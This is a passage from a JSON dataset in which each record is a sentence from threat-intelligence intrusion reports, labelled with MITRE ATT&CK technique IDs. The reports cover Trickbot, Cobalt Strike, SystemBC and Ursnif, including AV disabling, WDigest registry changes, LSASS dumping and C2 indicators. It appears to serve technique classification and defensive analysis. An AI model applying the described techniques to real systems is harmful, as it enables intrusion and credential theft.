      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon executing the entire command sequence, the ‘setup.exe’ file for the Atera Agent was successfully downloaded without encountering any issues.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Decoding it gives us several insights and IOCs (C2 IP, callback URLs, UA) on the threat actor’s infrastructure and methods.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This installer deploys the Atera agent, which is part of a remote monitoring and management tool.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The script also performs multiple defense evasion techniques by disabling Windows Defender, enabling RDP, and backdooring the system by replacing the accessibility features by cmd.exe as previously seen in cmd.cmd script.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Then, it uses a condition to perform several registry cleanups and modifications related to AV programs:",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The conditional statement is based on the system architecture PROCESSOR_ARCHITECTURE check, and make registry modifications accordingly.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Depending on whether the system is 32-bit or 64-bit, registry changes are made using appropriate paths (/reg:32 or /reg:64).",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The VmManagedSetup.exe executable was identified as SystemBC, a malware strain known to perform initial reconnaissance and deliver follow-up malware on select targets.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon starting, the malware immediately persists itself.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This SystemBC sample does so through run-key persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Specifically, it creates the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key of value socks5, intended to execute the sample through PowerShell.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The malware then periodically beacons, alternating between two C2s.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "To evade detection, SystemBC ensures its configuration is only decrypted to establish the C2 connection.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The malware supports both IPs and host names as C2 addresses.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The XOR-decoded configuration exposes both SystemBC servers as 94.198.55.181:4337 and 94.198.51.247:4337.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As SystemBC’s main functionality is to deploy additional malware, its download logic provides additional IoCs.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As outlined below, the VmManagedSetup.exe executable is capable of fetching additional payloads using a GET request over HTTP/1.0.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Its noteworthy that the download functionality relies on the default hard-coded port INTERNET_DEFAULT_HTTP_PORT, indicative of plain HTTP communications on port 80.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The WILD_PRIDE.exe executable is a Sliver implant, an open-source adversary “emulation” framework.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As the Sliver framework is written in Go and obfuscated using garble, relying on dynamic analysis provides the easiest method for C2 identification, which for this sample is the 94[.]198[.]53[.]143 open-directory server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Sliver relies on Protobuf to serialize command & control communications, which luckily, aren’t as easily obfuscated.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "These are divided into some of the different AV vendors, Hyper-V, and SQL, based on the below categories.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Aside from deletion of services, it also performs the killing of multiple processes.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "These commands are used to check if specific antivirus or endpoint security services are running on a Windows system.",
    "command": "",
    "labels": [
      "T1016",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The last command on this script is used to forcefully stop all processes with a PID of 1000 or higher, except those whose window titles start with “untitle”.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "It has exactly the same content of the previous script (z.bat) with additional defense evasion techniques and capabilities.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The first part of the script deletes services targeting well-known security AV vendors, as well as services related to Hyper-V and Microsoft SQL.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Second part of the script is to stop multiple services related to MS SQL, as well as disable the related services via “sc config” command.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "These commands delete registry entries for various antivirus and security services from the Windows Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "By targeting the HKLM\\SYSTEM\\CurrentControlSet\\services\\ path, they remove configurations for security software such as Kaspersky, Malwarebytes, McAfee, Norton, Avast, AVG, Avira, and many others, effectively disabling these services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "These are mainly related to Windows settings to enable Remote Desktop, adjust firewall rules, alter the behavior of certain utility programs, and change security policies.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Specifically, they allow Remote Desktop connections, create a firewall rule to allow incoming Remote Desktop traffic, and replace the functions of various accessibility tools and Help features with the Command Prompt.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, they disable UAC and Windows Defender and modify Remote Desktop, potentially weakening system security.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We assess, with moderate confidence, the Trickbot DLL that we executed was originally delivered via a malicious Office document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors were observed leveraging Trickbot and Cobalt Strike for C2 communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They began their discovery by running net and nltest commands as well as PowerView domain discovery modules.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "A registry value was set to enable storing logon credentials in plaintext in memory (WDigest), likely to facilitate future activity as the host was not restarted for this change to take effect.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Before the threat actors departed the network, they successfully accessed the LSASS process and retrieved credentials from memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "We assess with moderate confidence that this DLL was dropped by a malicious Office document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot, from its injected wermgr process, spawned a command process to then run a PowerShell Cobalt Strike Beacon.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Reviewing the above PowerShell code, we can extract the shellcode to discover the IP and User-agent string, the beacon will communicate with.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Getting the IP and port using scdbg.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also executed a second Cobalt Strike Beacon (wsuC3C.tmp) using the injected wermgr.exe process.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task was created to keep the Trickbot malware persistent on the system.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot injected into wermgr.exe processes and used this for communication to command and control infrastructure.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Below we can see registry hives being saved to disk.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "LSASS was accessed by rundll32, but we did not see anything written to disk.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot was used to enable the storage of clear text credentials (WDigest) by setting UseLogonCredential to 1.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Key - SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest Value name - UseLogonCredential Set value data - 1",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The following net commands were used by the threat actor from the injected Trickbot process.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The following nltest commands were used by the threat actor from the injected Trickbot process.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "PowerView modules were also used by the threat actor executed from the Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1016",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In this intrusion, we will take a look at a Trickbot infection, where soon after gaining access, the threat actor deployed Cobalt Strike and then started to enumerate the target network and dump credential information.",
    "command": "",
    "labels": [
      "T1016",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A setup file, which attempted to masquerade as a legitimate software installer, was deployed on several systems to fetch additional Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The zip attachment would likely contain a Word or Excel document with macros, which upon execution, would start a Trickbot infection.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The Trickbot payload injected itself into the system process wermgr.exe — the Windows process responsible for error reporting.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then utilized built-in Windows utilities such as net.exe, ipconfig.exe and nltest.exe for performing internal reconnaissance.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Within two minutes of the discovery activity, WDigest authentication was enabled (disabled by default in Windows 10) in the registry on the infected host.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after applying this registry modification, the LSASS process was dumped to disk using the Sysinternals tool ProcDump.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Having obtained sensitive credentials, WMIC was used to deploy a fake password manager application across multiple systems in the network.",
    "command": "",
    "labels": [
      "T1047",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The installed software package appears to have been trying to masquerade as the 1Password windows installer and password vault software.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The fake installer drops and executes a file embedded with Cobalt Strike stager shellcode, which attempts to fetch a CS beacon.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The results were dumped into a CSV file.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The Trickbot payload seen during this intrusion was likely spread via a weaponized Word or Excel file from an email campaign.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, the payload injects into the wermgr.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected wermgr.exe process then creates a new folder in the user’s AppData directory.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat).",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot utilized the same instance of wermgr.exe to load Cobalt Strike beacons into memory using PowerShell, which remained active throughout the intrusion:",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The fake setup installer (Setup1.exe) which was seen during the lateral movement stage, was dropped and executed on multiple systems, including the domain controllers.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1074.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The launcher.bat file, which triggers the Trickbot executable, is set to start via a scheduled task:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The GetSystem named pipe impersonation technique was observed to obtain SYSTEM-level privileges on the domain controller.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "To prepare for code injection, the Trickbot executable allocated memory in the address space of the Windows system process “wermgr.exe” (Windows Error Reporting Module).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected wermgr.exe process then called svchost.exe (without any command line arguments), which in turn was used to run various reconnaissance commands.",
    "command": "",
    "labels": [
      "T1016",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor enabled WDigest authentication by changing the value of the “UseLogonCredential” object from 0 to 1 in the Windows registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "On the initial beachhead, various discovery commands were executed from the injected svchost.exe process.",
    "command": "",
    "labels": [
      "T1016",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A diverse set of reconnaissance commands were also observed from the Cobalt Strike beacons:",
    "command": "",
    "labels": [
      "T1016",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the WMI class “win32_logicaldisk”, (free) disk space information was gathered of the attached (network) drive letters.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor made use of the Active Directory module to save hostname, OS and last logon date information of all AD Computer objects in a CSV file.",
    "command": "",
    "labels": [
      "T1016",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition, all of the IP-addresses in the LAN were scanned on port 445/SMB, potentially to identify other interesting targets.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The following set of files were copied to the domain controller:7-zip.dll 7z.dll, 7z.exe, get-datainfo.ps1, netscan.exe, start.bat",
    "command": "",
    "labels": [
      "T1070.004",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Already covered in a previous case, the batch and PowerShell scripts serve as a data collector to enumerate hosts within the target environment.",
    "command": "",
    "labels": [
      "T1016",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "It collects data about active/dead hosts, disks, and installed software; and stores it in a zip file.",
    "command": "",
    "labels": [
      "T1016",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "In an attempt to blend in, the Setup1.exe file acts as a fake installer for “1Password”, a popular online password manager.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "When the file is executed, it drops various files in the user’s AppData directory, including “filepass.exe”, which is started as a child process.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Filepass.exe then loads an unsigned DLL named theora2.dll:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "theora2.dll reads the data from an XML-file named “cds.xml”.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "This file is stored in the same directory (AppData\\Roaming\\1Password).",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "This file seems to contain the XML documentation (in Russian) of the System.IO package.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "A subset of the file buffer (cds.xml), which contains the obfuscated data patterns, is saved into a separate memory location.",
    "command": "",
    "labels": [
      "T1055",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The obfuscated/encrypted shellcode is then sent into a Cobalt Strike named pipe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In this case, the threat actor did not bother to change the default pipe naming convention of Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Pipes being created with the name MSSE-*-server are a great indicator to hunt for.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "From here, the CS stager used the WinInet API in an attempt to fetch a Cobalt Strike beacon hosted on windowsupdatesc[.]com.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In the raw shellcode we can find the URI and the User-Agent:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The HTTPS beacon spawned by filepass.exe continues to check in every ~5 seconds.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Trickbot threat actors used Cobalt Strike to pivot through-out the domain, dumping lsass and ntds.dit as they went.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They used tools such as AdFind, Nltest, Net, Bloodhound, and PowerView to peruse the domain, looking for high privileged credentials to accomplish their mission.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "They used PowerShell, SMB, and WMI to move laterally.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After executing on the infected endpoint, the Trickbot executable injected itself into the Window Error Reporting Manager (wermgr.exe).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Subsequent Trickbot command and control traffic then originated from the injected wermgr.exe process going forward.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the YARA rule generated by Malpedia we were able to locate Cobalt Strike injections in the following processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The first technique used was dumping passwords from lsass on the beachhead machine.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This command, which is included in DPAT, dumps NTDS.dit to disk and has been used by Trickbot actors in the past.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Event ID 2001, 2003, 102, 300, 301, 302, and 103 were all seen in response to the above command as well as a file create by lsass.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors ran the AdFind utility for domain discovery.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The following net commands were used by the threat actor.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors utilized several lateral movement techniques. The first of which was using a remote service to execute PowerShell from the registry.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The next lateral movement method used is SMB transfer and exec of batch files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This file was seen executed locally via cmd, and on remote systems using wmic.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "SMB was also used to transfer Cobalt Strike Beacon executables to the ADMIN$ share on systems, which were then executed via a service.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In the past month we witnessed a Trickbot infection lie dormant for several days before being scoped by Cobalt Strike and then left with just a Pyxie infection.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A Trickbot sample was run in the lab.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "We’ve seen the Trickbot actors use various unicode characters for some time now, we believe that the intention here is to evade security tools as many have difficulty parsing these characters and can fail to detect or even simply break while trying to parse these characters.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "During the time Trickbot was active network traffic indicated gtag man6",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Locally on the system the Trickbot config file showed the following configuration.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "From the infected host we saw two different processes get injected for running Trickbot and communications with the C2 infrastructure.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "These legitimate windows executables allow Trickbot to run unhindered and undetected on the system.",
    "command": "",
    "labels": [
      "T1055",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "After the initial checkins and setting up on the host, Trickbot proceeded to do nothing but beacon for 3 days.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot delivered a Cobalt Strike payload using PowerShell to inject into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This Cobalt Strike payload was using the malleable c2 amazon profile.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike ran a flurry of windows recon commands and this interesting AV enumeration script.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "At the same time that Cobalt activity began an additional entry point began using a combination of PyXie RAT and a Logmein signed binary used to load the RAT.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "C2 ip is 162.[]248[.]245[.]71 and the domain is benreat.com.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Here’s a keep alive from PyXie.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Looking at the content we see some interesting information being passed such as uptime, system name, admin or not, domain name, if in memory or on disk, godmode (system?), av check, os version, etc.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "After the initial flurry of activity Cobalt Strike fell off, PyXie continued with little beacon activity and once a day returning to dump creds via the registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This was followed by the threat actors moving laterally throughout the environment using an admin account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In this intrusion, a malicious ISO file was delivered to a user which contained Ursnif malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The malware displayed an interesting execution flow, which included using a renamed copy of rundll32.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Once executed, the malware conducted automatic discovery on the beachhead host, as we have observed with other loaders such as IcedID.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The malware also established persistence on the host with the creation of a registry run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used a Background Intelligent Transfer Service (BITS) job to download a Cobalt Strike beacon, and then used the beacon for subsequent actions.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig, systeminfo, net, and ping.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Using the credentials extracted from memory, the threat actors began to move laterally.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They targeted a domain controller and used Impacket’s wmiexec.py to execute code on the remote host.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "This included executing both a msi installer for the RMM tools Atera and Splashtop, as well as a Cobalt Strike executable beacon.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After connecting to the Cobalt Strike beacon on the domain controller, the threat actor executed another round of discovery tasks and dumped lsass memory on the domain controller.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The following day, there was a short check-in on the beachhead host from a Cobalt Strike beacon, no other activity occurred until near the end of the day.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "At that time, the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "One host of interest was one of the backup servers, which was logged into, the state of backups were checked and running processes were reviewed before exiting the session.",
    "command": "",
    "labels": [
      "T1016",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once mounted, the new drive contained a LNK file 6570872.lnk and hidden folder “me”.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "If we parse this LNK file with LECmd (by Eric Zimmerman), it highlights the execution path and the icon it appears as:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Of interest, the folder included a legitimate copy of rundll32.exe (renamed to 123.com).",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Once the user had mounted the ISO and the LNK file was executed by the user, the complex execution flow started.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Highlighted in Initial Access, the LNK file would execute a batch script alsoOne.bat.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Using the SRUM database, we were able to determine that the custom rundll32.exe binary downloaded approximately 0.4 MB of data.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This oneliner created a new ActiveX object to eval() the content stored in the registry key in the users registry hive.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "These two new aliases were used to get and execute the content in another registry value “MemoryJunk”.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The last registry key was used to store additional PowerShell code.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode stored in Base64.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "That is when we began to observe evidence indicative of “hands-on-keyboard” activity.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "An instance of cmd.exe was launched through explorer.exe which ran the following command:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This PowerShell command started a BITS job to download a Cobalt Strike beacon from 193.201.9[.]199 and saved it with a random name to %TEMP%.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The activity following this event demonstrated a clear distinction of the threat actor performing discovery manually.",
    "command": "",
    "labels": [
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Once the foothold had been achieved, after execution of Ursnif on the beachhead host, persistence was achieved by creating a ‘Run’ key named ManagerText which was configured to execute a LNK file which executed a PowerShell script.",
    "command": "",
    "labels": [
      "T1204.002",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "We observed a process created by Cobalt Strike accessing lsass.exe.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The GrantedAccess code of 0x1010 is a known indicator of such tools as Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "As we have observed in other malware, Ursnif ran a number of automated discovery commands to gain information about the environment.",
    "command": "",
    "labels": [
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor quickly took interest in a support account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This account belonged to the Domain Admin group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the /4 command line argument.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "WMI was used to pivot to a domain controller on the network.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The actor leveraged Impacket’s wmiexec.py to execute commands with a semi-interactive shell, most likely using credentials gathered by the previous LSASS access.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1047",
      "T1078",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The commands executed included directory traversal, host discovery, and execution of tools on the DC.",
    "command": "",
    "labels": [
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This command line closely resembles the code within the wmiexec.py as part of the Impacket tool maintained by Fortra.",
    "command": "",
    "labels": [
      "T1047",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As Impacket interacts with remote endpoints via WMI over TCP via DCERPC, its possible to inspect network level packets:",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The use of Impacket by threat actors has been recently detailed by CISA in alert AA22-277A – Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.",
    "command": "",
    "labels": [
      "T1047",
      "T1105"
    ]
  },
  {
    "type": "text",
